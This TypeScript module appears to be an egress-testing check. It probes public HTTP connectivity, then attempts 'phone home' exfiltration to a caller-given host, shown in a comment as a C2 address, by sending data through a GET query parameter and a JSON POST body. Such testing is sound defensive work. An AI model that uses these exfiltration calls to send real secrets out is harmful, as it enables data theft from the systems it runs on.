import { request } from "undici";
import { logger } from "../../logger.js";

export async function checkHTTP(target: string, data?: string): Promise<any> {
    const results: any = {
        protocol: "http",
        checks: []
    };

    const targets = [
        { url: "http://google.com", name: "public_http_google" },
        { url: "https://google.com", name: "public_https_google" },
        { url: "http://example.com", name: "public_http_example" },
    ];

    // 1. Connectivity Checks
    for (const t of targets) {
        try {
            const start = Date.now();
            const { statusCode } = await request(t.url, {
                method: "GET",
                headers: { "User-Agent": "Mozilla/5.0" }
            });
            results.checks.push({
                name: t.name,
                status: "success",
                code: statusCode,
                duration: Date.now() - start
            });
        } catch (e: any) {
            results.checks.push({
                name: t.name,
                status: "failed",
                error: e.message
            });
        }
    }

    // 2. Exfiltration (Phone Home)
    if (target) {
        // Assume target is like "http://my-c2.com"
        // Method A: Query Param
        try {
            const start = Date.now();
            const { statusCode } = await request(`${target}/pixel?data=${data || "ping"}`, { method: "GET" });
            results.checks.push({
                name: "exfil_http_get",
                status: statusCode < 400 ? "success" : "blocked",
                code: statusCode,
                duration: Date.now() - start
            });
        } catch (e: any) {
            results.checks.push({
                name: "exfil_http_get",
                status: "failed",
                error: e.message
            });
        }

        // Method B: POST Body
        try {
            const start = Date.now();
            const { statusCode } = await request(target, { 
                method: "POST",
                body: JSON.stringify({ secret: data || "secret-data" }),
                headers: { "Content-Type": "application/json" }
            });
            results.checks.push({
                name: "exfil_http_post",
                status: statusCode < 400 ? "success" : "blocked",
                code: statusCode,
                duration: Date.now() - start
            });
        } catch (e: any) {
            results.checks.push({
                name: "exfil_http_post",
                status: "failed",
                error: e.message
            });
        }
    }

    return results;
}
